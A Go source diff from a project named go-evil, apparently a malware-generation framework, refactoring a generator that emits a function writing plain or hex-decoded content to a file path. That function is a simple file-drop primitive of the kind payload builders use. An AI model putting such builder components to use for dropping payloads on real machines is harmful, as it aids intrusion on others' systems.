@@ -5,6 +5,7 @@ import (
 	"strings"
 
 	"github.com/TeamPhoneix/go-evil/utility/structure"
+	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
 	"github.com/TeamPhoneix/go-evil/utility/tools"
 )
 
@@ -23,31 +24,32 @@ func Write(s_json string, value string) ([]string, string) {
 		data = fmt.Sprintf("\"%s\"", data)
 	}
 
-	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(repr_1  []int, repr_2 []int){", function_call),
-		"path := spine.alpha.construct_string(repr_1)",
-		"path = spine.variable.get(path)",
+	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
+		Parameters: []string{"repr_1  []int", "repr_2 []int"},
+		Gut: []string{
+			"path := spine.alpha.construct_string(repr_1)",
+			"path = spine.variable.get(path)",
 
-		"content := spine.alpha.construct_string(repr_2)",
-		"content = spine.variable.get(content)",
+			"content := spine.alpha.construct_string(repr_2)",
+			"content = spine.variable.get(content)",
 
-		"file, err := os.Create(path)",
-		"if err != nil{",
-		"spine.log(err.Error())",
-		"return",
-		"}",
+			"file, err := os.Create(path)",
+			"if err != nil{",
+			"spine.log(err.Error())",
+			"return",
+			"}",
 
-		"defer file.Close()",
-		"result := tools.Starts_with(content, []string{\"[HEX];\"})",
-		"if ok := result[\"[HEX];\"]; !ok {",
-		"file.WriteString(content)",
-		"}else{",
-		"split := strings.Split(content, \",\")",
-		"for _, data := range split {",
-		"data, _ := hex.DecodeString(data)",
-		"file.Write(data)",
-		"}}}",
-	})
+			"defer file.Close()",
+			"result := tools.Starts_with(content, []string{\"[HEX];\"})",
+			"if ok := result[\"[HEX];\"]; !ok {",
+			"file.WriteString(content)",
+			"}else{",
+			"split := strings.Split(content, \",\")",
+			"for _, data := range split {",
+			"data, _ := hex.DecodeString(data)",
+			"file.Write(data)",
+			"}}",
+		}})
 
 	data_object.Add_go_import("encoding/hex")
 	data_object.Add_go_import("os")
